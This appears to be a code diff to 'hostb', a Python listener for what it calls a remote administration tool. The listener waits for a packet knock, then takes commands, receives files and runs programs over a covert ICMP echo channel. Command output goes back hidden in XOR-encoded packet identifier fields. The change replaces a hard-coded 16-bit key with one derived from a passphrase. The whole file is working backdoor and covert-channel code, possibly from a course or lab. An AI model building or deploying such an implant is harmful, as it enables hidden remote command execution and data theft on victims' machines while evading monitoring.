@@ -5,6 +5,7 @@ Usage:
 """
 
 import argparse
+import hashlib
 import os
 import shutil
 import signal
@@ -24,7 +25,6 @@ KNOCK_TIMEOUT_SECONDS = 5.0
 ACK_SOURCE_PORT = 9000
 ACK_DESTINATION_PORT = 54321
 TTL = 64
-PRE_SHARED_KEY = 0xA5C3
 CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
@@ -56,6 +56,7 @@ BPF_COMMAND = "icmp[icmptype] = icmp-echo"
 @dataclass
 class HostbArgs:
     iface: str | None
+    key: str
 
 
 @dataclass
@@ -66,6 +67,7 @@ class Context:
     iface: str | None = None
     connected_to: str | None = None
     connected: bool = False
+    key: int = 0
     stop_requested: threading.Event = field(default_factory=threading.Event)
 
 
@@ -155,12 +157,17 @@ def build_icmp_echo_request(identifier_encrypted, sequence):
     return with_checksum(compute_checksum(with_checksum(0)))
 
 
-def encrypt_identifier(plaintext):
-    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF
+def derive_key(key_string):
+    digest = hashlib.sha256(key_string.encode("utf-8")).digest()
+    return (digest[0] << 8) | digest[1]
 
 
-def decrypt_identifier(ciphertext):
-    return (ciphertext ^ PRE_SHARED_KEY) & 0xFFFF
+def encrypt_identifier(plaintext, key):
+    return (plaintext ^ key) & 0xFFFF
+
+
+def decrypt_identifier(ciphertext, key):
+    return (ciphertext ^ key) & 0xFFFF
 
 
 def open_raw_send_socket():
@@ -222,8 +229,9 @@ class KnockWatcher:
 
 
 class CommandWatcher:
-    def __init__(self, expected_source):
+    def __init__(self, expected_source, key):
         self.expected_source = expected_source
+        self.key = key
         self.command_code: int | None = None
         self.command_received = threading.Event()
 
@@ -240,7 +248,7 @@ class CommandWatcher:
 
         encrypted = int(icmp.id) & 0xFFFF
         sequence = int(icmp.seq) & 0xFFFF
-        command_code = decrypt_identifier(encrypted)
+        command_code = decrypt_identifier(encrypted, self.key)
         print(
             f"[CMD] from {self.expected_source} "
             f"id={encrypted:#06x} -> cmd={command_code} seq={sequence}"
@@ -250,8 +258,9 @@ class CommandWatcher:
 
 
 class FileReceiveWatcher:
-    def __init__(self, expected_source):
+    def __init__(self, expected_source, key):
         self.expected_source = expected_source
+        self.key = key
         self.filename_length: int | None = None
         self.file_size: int | None = None
         self.packets: dict[int, int] = {}    # seq -> decrypted 16-bit value
@@ -271,7 +280,7 @@ class FileReceiveWatcher:
 
         encrypted = int(icmp.id) & 0xFFFF
         sequence = int(icmp.seq) & 0xFFFF
-        value = decrypt_identifier(encrypted)
+        value = decrypt_identifier(encrypted, self.key)
 
         with self.lock:
             self.packets[sequence] = value
@@ -296,8 +305,9 @@ class FileReceiveWatcher:
 class ByteStreamWatcher:
     """Single-header byte stream: seq=1 size, seq=2..N+1 data chunks."""
 
-    def __init__(self, expected_source):
+    def __init__(self, expected_source, key):
         self.expected_source = expected_source
+        self.key = key
         self.byte_count: int | None = None
         self.packets: dict[int, int] = {}
         self.complete = threading.Event()
@@ -316,7 +326,7 @@ class ByteStreamWatcher:
 
         encrypted = int(icmp.id) & 0xFFFF
         sequence = int(icmp.seq) & 0xFFFF
-        value = decrypt_identifier(encrypted)
+        value = decrypt_identifier(encrypted, self.key)
 
         with self.lock:
             self.packets[sequence] = value
@@ -345,10 +355,10 @@ def reassemble_byte_stream(packets: dict[int, int], byte_count: int) -> bytes | 
     return bytes(out[:byte_count])
 
 
-def send_byte_stream(raw_socket, source_ip, destination_ip, payload: bytes):
+def send_byte_stream(raw_socket, source_ip, destination_ip, key, payload: bytes):
     byte_count = len(payload)
 
-    size_packet = build_icmp_echo_request(encrypt_identifier(byte_count), 1)
+    size_packet = build_icmp_echo_request(encrypt_identifier(byte_count, key), 1)
     size_ip = build_ip_header(
         source_ip, destination_ip, 20 + len(size_packet), socket.IPPROTO_ICMP
     )
@@ -363,7 +373,7 @@ def send_byte_stream(raw_socket, source_ip, destination_ip, payload: bytes):
         high = payload[offset]
         low = payload[offset + 1] if offset + 1 < byte_count else 0
         value = (high << 8) | low
-        icmp_packet = build_icmp_echo_request(encrypt_identifier(value), sequence)
+        icmp_packet = build_icmp_echo_request(encrypt_identifier(value, key), sequence)
         ip_packet = build_ip_header(
             source_ip, destination_ip, 20 + len(icmp_packet), socket.IPPROTO_ICMP
         )
@@ -387,20 +397,26 @@ def parse_arguments(ctx: Context, argv: list[str] | None = None):
         prog="hostb",
         description="Knock-then-command listener for the remote administration tool.",
     )
-    parser.add_argument("-i", "--iface", dest="iface", required=False,
+    parser.add_argument("-i", "--interface", dest="iface", required=False,
                         metavar="<interface>",
                         help="network interface to sniff on (default: scapy default)")
-
+    parser.add_argument("-k", "--key", dest="key", required=True,
+                        metavar="<key>",
+                        help="pre-shared key string (must match hosta)")
     try:
         parsed = parser.parse_args(argv)
     except SystemExit as exc:
         sys.exit(1 if exc.code else 0)
 
-    ctx.args = HostbArgs(iface=parsed.iface)
+    ctx.args = HostbArgs(iface=parsed.iface, key=parsed.key)
 
 
 def handle_arguments(ctx: Context):
+    if not ctx.args.key:
+        ctx.error_message = "key must be a non-empty string"
+        handle_error(ctx)
     ctx.iface = ctx.args.iface
+    ctx.key = derive_key(ctx.args.key)
     signal.signal(signal.SIGINT, lambda *_: ctx.stop_requested.set())
     signal.signal(signal.SIGTERM, lambda *_: ctx.stop_requested.set())
 
@@ -467,7 +483,7 @@ def listen_for_command(ctx: Context) -> int | None:
     if not ctx.connected:
         return None
 
-    watcher = CommandWatcher(expected_source=ctx.connected_to)
+    watcher = CommandWatcher(expected_source=ctx.connected_to, key=ctx.key)
     sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
     sniffer.start()
     print(f"[CMD] waiting for commands from {ctx.connected_to}")
@@ -492,7 +508,7 @@ def receive_file(ctx: Context):
 
     # Start sniffing for file packets before we send the ready-ack, so
     # we don't miss the size packet that may arrive immediately after.
-    watcher = FileReceiveWatcher(expected_source=ctx.connected_to)
+    watcher = FileReceiveWatcher(expected_source=ctx.connected_to, key=ctx.key)
     sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
     sniffer.start()
 
@@ -516,7 +532,7 @@ def receive_file(ctx: Context):
         handle_error(ctx)
 
     try:
-        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY), 1)
+        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY, ctx.key), 1)
         ip_header = build_ip_header(
             source_ip, ctx.connected_to,
             20 + len(icmp_packet), socket.IPPROTO_ICMP,
@@ -625,7 +641,7 @@ def run_program(ctx: Context):
     if not ctx.connected_to:
         return
 
-    watcher = ByteStreamWatcher(expected_source=ctx.connected_to)
+    watcher = ByteStreamWatcher(expected_source=ctx.connected_to, key=ctx.key)
     sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
     sniffer.start()
 
@@ -645,7 +661,7 @@ def run_program(ctx: Context):
         handle_error(ctx)
 
     try:
-        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY), 1)
+        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY, ctx.key), 1)
         ip_header = build_ip_header(
             source_ip, ctx.connected_to,
             20 + len(icmp_packet), socket.IPPROTO_ICMP,
@@ -712,7 +728,7 @@ def run_program(ctx: Context):
         print(f"[RUN] sending output back ({len(output)} bytes, {num_output_packets} packets)")
 
         try:
-            send_byte_stream(raw_socket, source_ip, ctx.connected_to, output)
+            send_byte_stream(raw_socket, source_ip, ctx.connected_to, ctx.key, output)
         except OSError as exc:
             ctx.error_message = f"failed to send output: {exc}"
             ctx.error_code = 2
